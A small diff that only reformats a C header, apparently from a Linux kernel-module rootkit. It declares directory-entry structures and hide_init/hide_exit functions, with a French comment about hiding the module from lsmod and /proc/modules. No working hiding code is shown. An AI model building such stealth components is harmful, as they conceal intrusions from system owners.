@@ -3,23 +3,25 @@
 
 #include <linux/fs.h>
 
-struct linux_dirent {
-    unsigned long  d_ino;
-    unsigned long  d_off;
+struct linux_dirent
+{
+    unsigned long d_ino;
+    unsigned long d_off;
     unsigned short d_reclen;
-    char           d_name[];
+    char d_name[];
 };
 
-struct linux_dirent64 {
+struct linux_dirent64
+{
     unsigned long long d_ino;
-    long long          d_off;
-    unsigned short     d_reclen;
-    unsigned char      d_type;
-    char               d_name[];
+    long long d_off;
+    unsigned short d_reclen;
+    unsigned char d_type;
+    char d_name[];
 };
 
 // Init / Exit
-int  hide_init(void);
+int hide_init(void);
 void hide_exit(void);
 
 // Cache le module de lsmod / /proc/modules
